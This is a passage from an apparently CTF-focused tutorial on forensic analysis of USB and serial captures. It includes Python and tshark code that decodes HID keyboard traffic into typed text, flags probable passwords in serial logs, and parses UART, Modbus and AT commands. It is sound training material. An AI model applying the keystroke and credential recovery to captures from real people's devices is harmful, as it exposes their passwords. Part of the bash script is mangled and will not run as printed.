def extract_usb_data(pcap_file, endpoint=None, output_file="usb_data.bin"):
    """Extract raw data from USB capture"""
    
    filter_str = "usb.capdata"
    if endpoint:
        filter_str = f"usb.endpoint_address == {endpoint} && usb.capdata"
    
    cmd = (f'tshark -r {pcap_file} -Y "{filter_str}" '
           f'-T fields -e usb.capdata')
    
    output = os.popen(cmd).read()
    
    data_bytes = bytearray()
    for line in output.strip().split('\n'):
        if line:
            # Remove colons and convert hex to bytes
            hex_data = line.replace(':', '')
            try:
                data_bytes.extend(bytes.fromhex(hex_data))
            except ValueError:
                continue
    
    with open(output_file, 'wb') as f:
        f.write(data_bytes)
    
    print(f"[*] Extracted {len(data_bytes)} bytes to {output_file}")
    
    # Analyze extracted data
    with open(output_file, 'rb') as f:
        header = f.read(16)
        print(f"[*] First 16 bytes (hex): {header.hex()}")
        print(f"[*] First 16 bytes (ascii): {header}")
    
    # Check file type
    file_type = os.popen(f'file {output_file}').read()
    print(f"[*] File type: {file_type.strip()}")
    
    return data_bytes
```

### USB Mass Storage Analysis

```bash
# Identify SCSI commands in USB mass storage traffic
tshark -r usb_storage.pcap -Y "usb.bInterfaceClass == 0x08" \
    -T fields -e usbms.cdb

# Extract bulk transfer data (potential filesystem data)
tshark -r usb_storage.pcap -Y "usb.transfer_type == 0x03" \
    -T fields -e usb.capdata | xxd -r -p > bulk_data.bin

# Analyze extracted data for filesystem signatures
binwalk bulk_data.bin
foremost -i bulk_data.bin -o recovered_files/
```

**Carving Files from USB Storage:**

```bash
# Look for common file signatures
strings -n 8 bulk_data.bin | grep -i -E "(jpg|png|pdf|flag|key)"

# Scalpel for file carving
cat > scalpel.conf << 'EOF'
jpg y 5000000 \xff\xd8\xff\xe0\x00\x10 \xff\xd9
png y 5000000 \x89PNG\x0d\x0a\x1a\x0a \x49\x45\x4e\x44\xae\x42\x60\x82
pdf y 5000000 %PDF \x25\x25EOF\x0d
EOF

scalpel -c scalpel.conf -o carved_output/ bulk_data.bin
```

## HID (Keyboard) Traffic Decoding

USB HID keyboard traffic encodes keystrokes as 8-byte packets. Each packet contains modifier keys and up to 6 simultaneous key codes.

### USB HID Packet Structure

Standard HID keyboard report (8 bytes):

```
Byte 0: Modifier keys bitmap
        Bit 0: Left Control
        Bit 1: Left Shift
        Bit 2: Left Alt
        Bit 3: Left GUI (Windows/Command)
        Bit 4: Right Control
        Bit 5: Right Shift
        Bit 6: Right Alt
        Bit 7: Right GUI

Byte 1: Reserved (typically 0x00)

Bytes 2-7: Pressed key codes (up to 6 simultaneous keys)
           0x00 = no key pressed
```

### Extracting Keyboard Data

```bash
# Extract HID interrupt data (typically endpoint 0x81)
tshark -r keyboard.pcap -Y "usb.transfer_type == 0x01" \
    -T fields -e usb.capdata | grep -v "^$" > keystroke_data.txt

# Alternative: filter by data length (keyboard packets are 8 bytes)
tshark -r keyboard.pcap -Y "usb.data_len == 8" \
    -T fields -e usb.capdata > keystroke_data.txt
```

### HID Keycode to Character Mapping

```python
# Standard USB HID keyboard scancodes
USB_HID_KEYMAP = {
    0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd', 0x08: 'e', 0x09: 'f',
    0x0A: 'g', 0x0B: 'h', 0x0C: 'i', 0x0D: 'j', 0x0E: 'k', 0x0F: 'l',
    0x10: 'm', 0x11: 'n', 0x12: 'o', 0x13: 'p', 0x14: 'q', 0x15: 'r',
    0x16: 's', 0x17: 't', 0x18: 'u', 0x19: 'v', 0x1A: 'w', 0x1B: 'x',
    0x1C: 'y', 0x1D: 'z',
    0x1E: '1', 0x1F: '2', 0x20: '3', 0x21: '4', 0x22: '5',
    0x23: '6', 0x24: '7', 0x25: '8', 0x26: '9', 0x27: '0',
    0x28: '\n',  # Enter
    0x29: '[ESC]',
    0x2A: '[BACKSPACE]',
    0x2B: '\t',  # Tab
    0x2C: ' ',   # Space
    0x2D: '-', 0x2E: '=', 0x2F: '[', 0x30: ']', 0x31: '\\',
    0x33: ';', 0x34: '\'', 0x35: '`', 0x36: ',', 0x37: '.', 0x38: '/',
    0x39: '[CAPSLOCK]',
    0x3A: '[F1]', 0x3B: '[F2]', 0x3C: '[F3]', 0x3D: '[F4]',
    0x3E: '[F5]', 0x3F: '[F6]', 0x40: '[F7]', 0x41: '[F8]',
    0x42: '[F9]', 0x43: '[F10]', 0x44: '[F11]', 0x45: '[F12]',
    0x4F: '[RIGHT]', 0x50: '[LEFT]', 0x51: '[DOWN]', 0x52: '[UP]',
    0x53: '[NUMLOCK]',
    # Numpad
    0x54: '/', 0x55: '*', 0x56: '-', 0x57: '+', 0x58: '\n',
    0x59: '1', 0x5A: '2', 0x5B: '3', 0x5C: '4', 0x5D: '5',
    0x5E: '6', 0x5F: '7', 0x60: '8', 0x61: '9', 0x62: '0',
    0x63: '.',
}

# Shifted characters
USB_HID_SHIFT_MAP = {
    0x04: 'A', 0x05: 'B', 0x06: 'C', 0x07: 'D', 0x08: 'E', 0x09: 'F',
    0x0A: 'G', 0x0B: 'H', 0x0C: 'I', 0x0D: 'J', 0x0E: 'K', 0x0F: 'L',
    0x10: 'M', 0x11: 'N', 0x12: 'O', 0x13: 'P', 0x14: 'Q', 0x15: 'R',
    0x16: 'S', 0x17: 'T', 0x18: 'U', 0x19: 'V', 0x1A: 'W', 0x1B: 'X',
    0x1C: 'Y', 0x1D: 'Z',
    0x1E: '!', 0x1F: '@', 0x20: '#', 0x21: '$', 0x22: '%',
    0x23: '^', 0x24: '&', 0x25: '*', 0x26: '(', 0x27: ')',
    0x2D: '_', 0x2E: '+', 0x2F: '{', 0x30: '}', 0x31: '|',
    0x33: ':', 0x34: '"', 0x35: '~', 0x36: '<', 0x37: '>', 0x38: '?',
}

def decode_hid_keyboard(data_file):
    """Decode USB HID keyboard capture to text"""
    
    output = []
    
    with open(data_file, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line == '00:00:00:00:00:00:00:00':
                continue
            
            # Parse hex data
            parts = line.replace(':', '').strip()
            
            if len(parts) < 16:  # 8 bytes = 16 hex chars
                continue
            
            try:
                # Convert to bytes
                packet = bytes.fromhex(parts[:16])
                
                modifier = packet[0]
                keycodes = packet[2:8]
                
                # Check for shift modifier
                shift_pressed = (modifier & 0x02) or (modifier & 0x20)
                
                # Decode each keycode
                for keycode in keycodes:
                    if keycode == 0x00:
                        continue
                    
                    if shift_pressed and keycode in USB_HID_SHIFT_MAP:
                        output.append(USB_HID_SHIFT_MAP[keycode])
                    elif keycode in USB_HID_KEYMAP:
                        output.append(USB_HID_KEYMAP[keycode])
                    else:
                        output.append(f'[UNKNOWN:0x{keycode:02x}]')
                        
            except ValueError as e:
                print(f"[!] Error parsing line: {line} - {e}")
                continue
    
    decoded_text = ''.join(output)
    print("[*] Decoded keystrokes:")
    print(decoded_text)
    
    return decoded_text
```

### Complete Keyboard Decoder Script

```python
#!/usr/bin/env python3

import sys

def decode_usb_keyboard_pcap(pcap_file):
    """
    Complete USB keyboard decoder workflow
    """
    import os
    
    # Step 1: Extract capdata
    print("[*] Extracting USB HID data...")
    os.system(f'tshark -r {pcap_file} -Y "usb.capdata && usb.data_len == 8" '
              f'-T fields -e usb.capdata > /tmp/usb_keys.txt')
    
    # Step 2: Decode
    USB_CODES = {
        0x04: ('a', 'A'), 0x05: ('b', 'B'), 0x06: ('c', 'C'), 0x07: ('d', 'D'),
        0x08: ('e', 'E'), 0x09: ('f', 'F'), 0x0A: ('g', 'G'), 0x0B: ('h', 'H'),
        0x0C: ('i', 'I'), 0x0D: ('j', 'J'), 0x0E: ('k', 'K'), 0x0F: ('l', 'L'),
        0x10: ('m', 'M'), 0x11: ('n', 'N'), 0x12: ('o', 'O'), 0x13: ('p', 'P'),
        0x14: ('q', 'Q'), 0x15: ('r', 'R'), 0x16: ('s', 'S'), 0x17: ('t', 'T'),
        0x18: ('u', 'U'), 0x19: ('v', 'V'), 0x1A: ('w', 'W'), 0x1B: ('x', 'X'),
        0x1C: ('y', 'Y'), 0x1D: ('z', 'Z'),
        0x1E: ('1', '!'), 0x1F: ('2', '@'), 0x20: ('3', '#'), 0x21: ('4', '$'),
        0x22: ('5', '%'), 0x23: ('6', '^'), 0x24: ('7', '&'), 0x25: ('8', '*'),
        0x26: ('9', '('), 0x27: ('0', ')'),
        0x28: ('\n', '\n'), 0x2A: ('[BS]', '[BS]'), 0x2B: ('\t', '\t'),
        0x2C: (' ', ' '), 0x2D: ('-', '_'), 0x2E: ('=', '+'),
        0x2F: ('[', '{'), 0x30: (']', '}'), 0x31: ('\\', '|'),
        0x33: (';', ':'), 0x34: ('\'', '"'), 0x35: ('`', '~'),
        0x36: (',', '<'), 0x37: ('.', '>'), 0x38: ('/', '?'),
    }
    
    result = []
    prev_keys = set()
    
    with open('/tmp/usb_keys.txt', 'r') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            
            # Parse packet
            hex_str = line.replace(':', '')
            if len(hex_str) < 16:
                continue
            
            packet = bytes.fromhex(hex_str[:16])
            modifier = packet[0]
            keys = set(packet[2:8]) - {0x00}
            
            # Detect new key presses (key down events)
            new_keys = keys - prev_keys
            
            for key in new_keys:
                if key in USB_CODES:
                    shift = bool(modifier & 0x22)  # Left or Right Shift
                    char = USB_CODES[key][1 if shift else 0]
                    result.append(char)
            
            prev_keys = keys
    
    output = ''.join(result)
    print("\n[*] Decoded text:")
    print(output)
    
    with open('decoded_keystrokes.txt', 'w') as f:
        f.write(output)
    
    print("\n[*] Saved to decoded_keystrokes.txt")
    return output

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <usb_capture.pcap>")
        sys.exit(1)
    
    decode_usb_keyboard_pcap(sys.argv[1])
```

### Handling Key Repeat and Timing

```python
def decode_with_timing(pcap_file):
    """
    Decode keystrokes with timing information
    Useful for detecting pauses/hesitations
    """
    import os
    
    # Extract with timestamps
    cmd = (f'tshark -r {pcap_file} -Y "usb.capdata && usb.data_len == 8" '
           f'-T fields -e frame.time_relative -e usb.capdata')
    
    output = os.popen(cmd).read()
    
    keystrokes = []
    prev_time = 0
    
    for line in output.strip().split('\n'):
        if not line:
            continue
        
        parts = line.split('\t')
        if len(parts) < 2:
            continue
        
        timestamp = float(parts[0])
        capdata = parts[1].replace(':', '')
        
        if len(capdata) >= 16:
            packet = bytes.fromhex(capdata[:16])
            
            # Calculate time delta
            delta = timestamp - prev_time
            prev_time = timestamp
            
            # Long pause might indicate separation between commands/passwords
            if delta > 2.0:
                keystrokes.append('\n[PAUSE: {:.2f}s]\n'.format(delta))
            
            # Decode keystroke
            # ... (use previous decoding logic)
    
    return keystrokes
```

## Serial Communication Analysis

Serial protocols (UART, RS-232, TTL) captured via USB-to-serial adapters or logic analyzers contain raw byte streams requiring protocol-specific parsing.

### Identifying Serial Traffic

```bash
# USB CDC (Communications Device Class) indicates serial adapter
tshark -r serial.pcap -Y "usb.bInterfaceClass == 0x0a" \
    -T fields -e usb.src -e usb.dst -e usb.capdata

# Common serial adapter endpoint (often 0x81 for RX, 0x01 for TX)
tshark -r serial.pcap -Y "usb.endpoint_address == 0x81" \
    -T fields -e usb.capdata > serial_rx.txt

tshark -r serial.pcap -Y "usb.endpoint_address == 0x01" \
    -T fields -e usb.capdata > serial_tx.txt
```

### Extracting Serial Data

```python
def extract_serial_data(pcap_file, endpoint=0x81):
    """
    Extract serial data from USB CDC capture
    """
    import os
    
    cmd = (f'tshark -r {pcap_file} '
           f'-Y "usb.endpoint_address == {hex(endpoint)} && usb.capdata" '
           f'-T fields -e usb.capdata')
    
    output = os.popen(cmd).read()
    
    data = bytearray()
    for line in output.strip().split('\n'):
        if line:
            hex_data = line.replace(':', '')
            try:
                data.extend(bytes.fromhex(hex_data))
            except ValueError:
                continue
    
    # Save raw data
    with open(f'serial_ep{endpoint:02x}.bin', 'wb') as f:
        f.write(data)
    
    # Attempt text interpretation
    try:
        text = data.decode('utf-8', errors='replace')
        print(f"[*] Decoded as UTF-8:\n{text}")
    except:
        pass
    
    # Try ASCII
    try:
        text = data.decode('ascii', errors='replace')
        print(f"[*] Decoded as ASCII:\n{text}")
    except:
        pass
    
    # Show hex dump
    print(f"\n[*] Hex dump (first 256 bytes):")
    print(data[:256].hex())
    
    return data
```

### Common Serial Protocols

**ASCII-based protocols** (AT commands, terminal sessions):

```python
def analyze_ascii_serial(data_file):
    """Parse ASCII serial communications"""
    
    with open(data_file, 'rb') as f:
        data = f.read()
    
    # Decode as ASCII, replace non-printable
    text = data.decode('ascii', errors='replace')
    
    # Split into lines
    lines = text.split('\n')
    
    print("[*] Serial Communication Log:")
    print("=" * 60)
    
    for i, line in enumerate(lines, 1):
        line = line.strip()
        if line:
            print(f"{i:4d}: {line}")
    
    # Look for common patterns
    print("\n[*] Pattern Analysis:")
    
    if 'AT+' in text:
        print("  - AT commands detected (modem/cellular)")
    
    if 'login:' in text.lower() or 'password:' in text.lower():
        print("  - Login prompt detected")
    
    if text.count('$') > 3 or text.count('#') > 3:
        print("  - Shell prompt detected")
    
    # Extract potential credentials
    for i, line in enumerate(lines):
        if 'password' in line.lower() and i + 1 < len(lines):
            print(f"  - Potential password: {lines[i+1]}")
```

**Binary protocols** (Modbus, proprietary):

```python
def analyze_binary_serial(data_file):
    """
    Analyze binary serial protocol
    """
    with open(data_file, 'rb') as f:
        data = f.read()
    
    print(f"[*] Total bytes: {len(data)}")
    
    # Byte frequency analysis
    from collections import Counter
    byte_freq = Counter(data)
    
    print("\n[*] Most common bytes:")
    for byte, count in byte_freq.most_common(10):
        print(f"  0x{byte:02x}: {count} occurrences ({count/len(data)*100:.1f}%)")
    
    # Look for frame delimiters (common start/end bytes)
    potential_delimiters = [b for b, c in byte_freq.items() 
                           if 10 < c < len(data) / 10]
    
    print(f"\n[*] Potential frame delimiters: {[hex(b) for b in potential_delimiters]}")
    
    # Entropy check
    import math
    entropy = -sum((count/len(data)) * math.log2(count/len(data)) 
                   for count in byte_freq.values())
    print(f"\n[*] Entropy: {entropy:.2f} bits/byte")
    print(f"    (Low <4: structured, High >7: encrypted/compressed)")
    
    return data
```

### Protocol-Specific Parsers

**Modbus RTU:**

```python
def parse_modbus_rtu(data):
    """
    Parse Modbus RTU serial protocol
    [Inference] Basic parser - may need adjustment for specific implementations
    """
    
    packets = []
    i = 0
    
    while i < len(data) - 4:  # Minimum Modbus frame
        # Modbus RTU frame: [Slave ID][Function][Data...][CRC-16]
        slave_id = data[i]
        function_code = data[i+1]
        
        # Estimate frame length based on function code
        if function_code in [0x01, 0x02, 0x03, 0x04]:  # Read functions
            frame_len = 8  # Typical for read requests
        elif function_code in [0x05, 0x06]:  # Write single
            frame_len = 8
        elif function_code in [0x0F, 0x10]:  # Write multiple
            if i+6 < len(data):
                byte_count = data[i+6]
                frame_len = 9 + byte_count
            else:
                i += 1
                continue
        else:
            i += 1
            continue
        
        if i + frame_len > len(data):
            break
        
        frame = data[i:i+frame_len]
        
        # Verify CRC (last 2 bytes, little-endian)
        # [Unverified] CRC verification implementation may vary
        
        packets.append({
            'slave_id': slave_id,
            'function': function_code,
            'data': frame[2:-2],
            'raw': frame
        })
        
        i += frame_len
    
    print(f"[*] Found {len(packets)} potential Modbus frames")
    for pkt in packets[:10]:  # Show first 10
        print(f"  Slave: {pkt['slave_id']:02x}, "
              f"Function: {pkt['function']:02x}, "
              f"Data: {pkt['data'].hex()}")
    
    return packets
```

**AT Command Parser:**

```python
def parse_at_commands(text):
    """Parse AT modem/cellular commands"""
    
    import re
    
    # AT command pattern
    at_pattern = re.compile(r'AT[+\w]*[=?]?[^\r\n]*', re.IGNORECASE)
    
    commands = at_pattern.findall(text)
    
    print(f"[*] Found {len(commands)} AT commands:")
    
    for cmd in commands:
        cmd = cmd.strip()
        
        # Identify command type
        if 'CMGS' in cmd:
            print(f"  [SMS SEND] {cmd}")
        elif 'CMGR' in cmd:
            print(f"  [SMS READ] {cmd}")
        elif 'CPIN' in cmd:
            print(f"  [SIM PIN] {cmd}")
        elif 'CGDCONT' in cmd:
            print(f"  [APN CONFIG] {cmd}")
        else:
            print(f"  {cmd}")
    
    return commands
```

### Reconstructing Bidirectional Communication

```python
def reconstruct_conversation(pcap_file):
    """
    Reconstruct bidirectional serial conversation
    Requires distinguishing TX/RX endpoints
    """
    import os
    
    # Extract with direction markers
    tx_data = []
    rx_data = []
    
    # Endpoint 0x01 = TX (host to device)
    cmd = (f'tshark -r {pcap_file} '
           f'-Y "usb.endpoint_address == 0x01 && usb.capdata" '
           f'-T fields -e frame.time_relative -e usb.capdata')
    
    for line in os.popen(cmd).read().strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) == 2:
                timestamp = float(parts[0])
                data = bytes.fromhex(parts[1].replace(':', ''))
                tx_data.append((timestamp, data))
    
    # Endpoint 0x81 = RX (device to host)
    cmd = (f'tshark -r {pcap_file} '
           f'-Y "usb.endpoint_address == 0x81 && usb.capdata" '
           f'-T fields -e frame.time_relative -e usb.capdata')
    
    for line in os.popen(cmd).read().strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) == 2:
                timestamp = float(parts[0])
                data = bytes.fromhex(parts[1].replace(':', ''))
                rx_data.append((timestamp, data))
    
    # Merge and sort by timestamp
    conversation = []
    conversation.extend([('TX', t, d) for t, d in tx_data])
    conversation.extend([('RX', t, d) for t, d in rx_data])
    conversation.sort(key=lambda x: x[1])
    
    # Display conversation
    print("[*] Serial Conversation:")
    print("=" * 80)
    
    for direction, timestamp, data in conversation:
        try:
            text = data.decode('ascii', errors='replace')
            print(f"[{timestamp:8.3f}] {direction}: {text.strip()}")
        except:
            print(f"[{timestamp:8.3f}] {direction}: {data.hex()}")
    
    return conversation
```

### Complete Serial Analysis Script

```bash
#!/bin/bash
# Comprehensive serial analysis workflow

PCAP="$1"

if [ -z "$PCAP" ]; then
    echo "Usage: $0 <capture.pcap>"
    exit 1
fi

echo "[*] Serial Communication Analysis for $PCAP"
echo "=========================================="

# 1. Identify USB CDC devices
echo -e "\n[*] USB CDC Devices:" 
tshark -r "$PCAP" -Y "usb.bInterfaceClass == 0x0a"  
-T fields -e usb.src -e usb.idVendor -e usb.idProduct | sort -u

# 2. List available endpoints

echo -e "\n[*] Active USB Endpoints:" tshark -r "$PCAP" -Y "usb.endpoint_address && usb.capdata"  
-T fields -e usb.endpoint_address | sort -u | while read ep; do count=$(tshark -r "$PCAP" -Y "usb.endpoint_address == $ep" | wc -l) echo " Endpoint $ep: $count packets" done

# 3. Extract RX data (typically 0x81)

echo -e "\n[*] Extracting RX data (endpoint 0x81)..." tshark -r "$PCAP" -Y "usb.endpoint_address == 0x81 && usb.capdata"  
-T fields -e usb.capdata | tr -d ':' | xxd -r -p > serial_rx.bin

# 4. Extract TX data (typically 0x01)

echo -e "\n[*] Extracting TX data (endpoint 0x01)..." tshark -r "$PCAP" -Y "usb.endpoint_address == 0x01 && usb.capdata"  
-T fields -e usb.capdata | tr -d ':' | xxd -r -p > serial_tx.bin

# 5. Analyze extracted data

echo -e "\n[*] RX Data Analysis:" if [ -s serial_rx.bin ]; then echo " Size: $(wc -c < serial_rx.bin) bytes" echo " File type: $(file -b serial_rx.bin)" echo " Printable strings:" strings -n 4 serial_rx.bin | head -20 else echo " No RX data found" fi

echo -e "\n[*] TX Data Analysis:" if [ -s serial_tx.bin ]; then echo " Size: $(wc -c < serial_tx.bin) bytes" echo " File type: $(file -b serial_tx.bin)" echo " Printable strings:" strings -n 4 serial_tx.bin | head -20 else echo " No TX data found" fi

# 6. Create conversation view

echo -e "\n[*] Generating conversation view..." python3 << 'PYEOF'
import sys
import subprocess

def create_conversation(pcap):
    """
    Creates a conversation log from a pcap file using tshark.
    
    :param pcap: Path to the pcap file.
    """

    # Get TX with timestamps
    tx_cmd = f"tshark -r {pcap} -Y 'usb.endpoint_address == 0x01 && usb.capdata' -T fields -e frame.time_relative -e usb.capdata"
    tx_result = subprocess.run(tx_cmd, shell=True, capture_output=True, text=True)

    # Get RX with timestamps
    rx_cmd = f"tshark -r {pcap} -Y 'usb.endpoint_address == 0x81 && usb.capdata' -T fields -e frame.time_relative -e usb.capdata"
    rx_result = subprocess.run(rx_cmd, shell=True, capture_output=True, text=True)

    events = []

    # Parse TX
    for line in tx_result.stdout.strip().split('\n'):
        if line and '\t' in line:
            parts = line.split('\t')
            ts = float(parts[0])
            data = bytes.fromhex(parts[1].replace(':', ''))
            events.append((ts, 'TX', data))

    # Parse RX
    for line in rx_result.stdout.strip().split('\n'):
        if line and '\t' in line:
            parts = line.split('\t')
            ts = float(parts[0])
            data = bytes.fromhex(parts[1].replace(':', ''))
            events.append((ts, 'RX', data))

    # Sort by timestamp
    events.sort()

    # Display
    print("Time(s)  | Dir | Data")
    print("-" * 70)
    for ts, direction, data in events[:50]:  # First 50 events
        try:
            text = data.decode('ascii', errors='replace').strip()
            if text:
                print(f"{ts:8.3f} | {direction} | {text[:50]}")
        except:
            print(f"{ts:8.3f} | {direction} | {data.hex()[:50]}")

if __name__ == '__main__':
    if len(sys.argv) > 1:
        create_conversation(sys.argv[1])
    else:
        print("Usage: python script.py <pcap_file>")
PYEOF
````

### Logic Analyzer Data (VCD/CSV Format)

Some CTF challenges provide logic analyzer captures in Value Change Dump (VCD) or CSV format instead of PCAP.

**VCD Format Parsing:**

```python
def parse_vcd_serial(vcd_file):
    """
    Parse VCD (Value Change Dump) for serial data
    Common in logic analyzer captures
    """
    
    with open(vcd_file, 'r') as f:
        lines = f.readlines()
    
    # Parse VCD header
    signals = {}
    in_definitions = True
    data_started = False
    
    for line in lines:
        line = line.strip()
        
        if line.startswith('$var'):
            # $var wire 1 ! rx $end
            parts = line.split()
            if len(parts) >= 5:
                signal_id = parts[3]
                signal_name = parts[4]
                signals[signal_id] = {'name': signal_name, 'changes': []}
        
        elif line.startswith('$enddefinitions'):
            in_definitions = False
            data_started = True
        
        elif data_started and not line.startswith('$'):
            # Value changes: "0!" or "#1000" (timestamp)
            if line.startswith('#'):
                current_time = int(line[1:])
            elif len(line) >= 2:
                value = line[0]
                signal_id = line[1]
                if signal_id in signals:
                    signals[signal_id]['changes'].append((current_time, int(value)))
    
    print(f"[*] Found {len(signals)} signals")
    for sig_id, sig_data in signals.items():
        print(f"  {sig_data['name']}: {len(sig_data['changes'])} changes")
    
    return signals

def decode_uart_from_vcd(signals, tx_signal='tx', baud_rate=9600):
    """
    Decode UART from VCD signal transitions
    [Inference] Assumes standard 8N1 configuration (8 data bits, no parity, 1 stop bit)
    """
    
    # Find TX signal
    tx_changes = None
    for sig_data in signals.values():
        if sig_data['name'].lower() == tx_signal.lower():
            tx_changes = sig_data['changes']
            break
    
    if not tx_changes:
        print(f"[!] Signal '{tx_signal}' not found")
        return None
    
    # Calculate bit duration from baud rate
    # VCD times are typically in timescale units (e.g., nanoseconds)
    # [Unverified] Timescale must be determined from VCD header
    bit_duration = 1.0 / baud_rate  # seconds
    
    print(f"[*] Decoding UART at {baud_rate} baud")
    print(f"[*] Bit duration: {bit_duration * 1e6:.2f} µs")
    
    decoded_bytes = []
    i = 0
    
    while i < len(tx_changes) - 10:
        time, value = tx_changes[i]
        
        # Look for start bit (high to low transition)
        if value == 0 and i > 0 and tx_changes[i-1][1] == 1:
            byte_val = 0
            
            # Sample data bits (LSB first in UART)
            for bit_num in range(8):
                # Calculate sample time (middle of bit period)
                sample_time = time + (bit_num + 1.5) * bit_duration
                
                # Find signal value at sample time
                bit_value = 0
                for j in range(i, min(i+20, len(tx_changes))):
                    if tx_changes[j][0] > sample_time:
                        bit_value = tx_changes[j-1][1] if j > 0 else 0
                        break
                
                byte_val |= (bit_value << bit_num)
            
            decoded_bytes.append(byte_val)
            
            # Skip to after stop bit
            i += 10
        else:
            i += 1
    
    decoded_data = bytes(decoded_bytes)
    print(f"[*] Decoded {len(decoded_data)} bytes")
    print(f"[*] Text: {decoded_data.decode('ascii', errors='replace')}")
    
    return decoded_data
````

**CSV Format (Saleae/PulseView):**

```python
def parse_saleae_csv(csv_file):
    """
    Parse Saleae Logic / PulseView CSV export
    Format: Time[s], Channel0, Channel1, ...
    """
    import csv
    
    with open(csv_file, 'r') as f:
        reader = csv.DictReader(f)
        
        # Get channel names
        fieldnames = reader.fieldnames
        print(f"[*] Channels found: {fieldnames[1:]}")  # Skip 'Time' column
        
        data = list(reader)
    
    print(f"[*] Total samples: {len(data)}")
    
    # Look for UART-like channels (TX/RX)
    for channel in fieldnames[1:]:
        if 'tx' in channel.lower() or 'rx' in channel.lower():
            print(f"\n[*] Analyzing channel: {channel}")
            
            # Extract transitions
            transitions = []
            prev_value = None
            
            for row in data:
                time = float(row['Time[s]'])
                value = int(row[channel])
                
                if value != prev_value:
                    transitions.append((time, value))
                    prev_value = value
            
            print(f"  Transitions: {len(transitions)}")
            
            # Estimate baud rate from transitions
            if len(transitions) > 10:
                bit_times = []
                for i in range(1, min(100, len(transitions))):
                    bit_times.append(transitions[i][0] - transitions[i-1][0])
                
                import statistics
                avg_bit_time = statistics.median(bit_times)
                estimated_baud = int(1 / avg_bit_time)
                
                print(f"  Estimated baud rate: {estimated_baud}")
```

### Advanced USB Analysis Techniques

**USB Request/Response Correlation:**

```python
def correlate_usb_requests(pcap_file):
    """
    Correlate USB control requests with responses
    Useful for understanding device configuration
    """
    import os
    
    # Extract control transfers
    cmd = (f'tshark -r {pcap_file} -Y "usb.transfer_type == 0x02" '
           f'-T fields -e frame.number -e usb.request -e usb.wValue '
           f'-e usb.wIndex -e usb.data_len')
    
    output = os.popen(cmd).read()
    
    requests = []
    for line in output.strip().split('\n'):
        if line:
            parts = line.split('\t')
            if len(parts) >= 4:
                requests.append({
                    'frame': parts[0],
                    'request': parts[1],
                    'wValue': parts[2],
                    'wIndex': parts[3]
                })
    
    print(f"[*] Found {len(requests)} control transfers")
    
    # Common USB requests
    request_types = {
        '0x06': 'GET_DESCRIPTOR',
        '0x09': 'SET_CONFIGURATION',
        '0x0b': 'SET_INTERFACE',
        '0x00': 'GET_STATUS',
        '0x03': 'SET_FEATURE'
    }
    
    for req in requests[:20]:  # Show first 20
        req_type = request_types.get(req['request'], 'UNKNOWN')
        print(f"  Frame {req['frame']}: {req_type} "
              f"(wValue={req['wValue']}, wIndex={req['wIndex']})")
```

**USB Descriptor Extraction:**

```python
def extract_usb_descriptors(pcap_file):
    """
    Extract and parse USB device descriptors
    Reveals device capabilities and configuration
    """
    import os
    
    # Device descriptor (bDescriptorType = 0x01)
    cmd = (f'tshark -r {pcap_file} '
           f'-Y "usb.bDescriptorType == 0x01" '
           f'-T fields -e usb.capdata')
    
    output = os.popen(cmd).read().strip()
    
    if output:
        print("[*] Device Descriptor:")
        for line in output.split('\n'):
            if line:
                data = bytes.fromhex(line.replace(':', ''))
                if len(data) >= 18:
                    print(f"  Vendor ID: 0x{int.from_bytes(data[8:10], 'little'):04x}")
                    print(f"  Product ID: 0x{int.from_bytes(data[10:12], 'little'):04x}")
                    print(f"  Device Class: 0x{data[4]:02x}")
                    print(f"  Max Packet Size: {data[7]}")
                    break
    
    # Configuration descriptor (bDescriptorType = 0x02)
    cmd = (f'tshark -r {pcap_file} '
           f'-Y "usb.bDescriptorType == 0x02" '
           f'-T fields -e usb.capdata')
    
    output = os.popen(cmd).read().strip()
    
    if output:
        print("\n[*] Configuration Descriptor:")
        for line in output.split('\n'):
            if line:
                data = bytes.fromhex(line.replace(':', ''))
                if len(data) >= 9:
                    num_interfaces = data[4]
                    config_value = data[5]
                    print(f"  Configuration: {config_value}")
                    print(f"  Interfaces: {num_interfaces}")
                    break
```

### CTF-Specific Tips

**Common CTF Patterns:**

1. **Keyboard captures**: Look for flag format strings (e.g., "flag{", "CTF{")
2. **Serial captures**: Check for base64/hex encoded data in ASCII streams
3. **Timing channels**: Analyze inter-packet delays for binary encoding
4. **Fragmented data**: Data may be split across multiple packets/transfers
5. **Mixed protocols**: Flags might span USB + network traffic

**Quick Flag Extraction:**

```bash
# Extract all text from USB capture
tshark -r capture.pcap -T fields -e usb.capdata | \
    tr -d ':' | xxd -r -p | strings | grep -i flag

# Search for common flag formats
tshark -r capture.pcap -T fields -e usb.capdata | \
    tr -d ':' | xxd -r -p | \
    grep -aoE '(flag|ctf|htb)\{[^}]+\}' -i

# Extract and decode keyboard data quickly
tshark -r keyboard.pcap -Y "usb.data_len == 8" \
    -T fields -e usb.capdata > keys.txt
python3 keyboard_decoder.py keys.txt
```

**Automation Script:**

```python
#!/usr/bin/env python3
"""
Automated USB/Hardware CTF capture analyzer
"""

import os
import sys
import subprocess

def analyze_capture(pcap_file):
    """
    Automated analysis workflow for CTF USB captures
    """
    
    print(f"[*] Analyzing {pcap_file}")
    print("=" * 60)
    
    # 1. Identify capture type
    result = subprocess.run(
        ['tshark', '-r', pcap_file, '-q', '-z', 'io,phs'],
        capture_output=True, text=True
    )
    
    capture_type = None
    
    if 'usbhid' in result.stdout.lower():
        capture_type = 'keyboard'
        print("[*] Detected: USB HID Keyboard capture")
    elif 'cdc' in result.stdout.lower() or 'serial' in result.stdout.lower():
        capture_type = 'serial'
        print("[*] Detected: Serial/CDC capture")
    elif 'mass storage' in result.stdout.lower():
        capture_type = 'storage'
        print("[*] Detected: USB Mass Storage capture")
    else:
        capture_type = 'unknown'
        print("[*] Unknown capture type, attempting generic analysis")
    
    # 2. Type-specific analysis
    if capture_type == 'keyboard':
        print("\n[*] Extracting keyboard data...")
        os.system(f'tshark -r {pcap_file} -Y "usb.data_len == 8" '
                  f'-T fields -e usb.capdata > /tmp/keys.txt')
        
        # Decode (using previous keyboard decoder)
        print("[*] Attempting keyboard decode...")
        # Call decoder function here
    
    elif capture_type == 'serial':
        print("\n[*] Extracting serial data...")
        os.system(f'tshark -r {pcap_file} -Y "usb.capdata" '
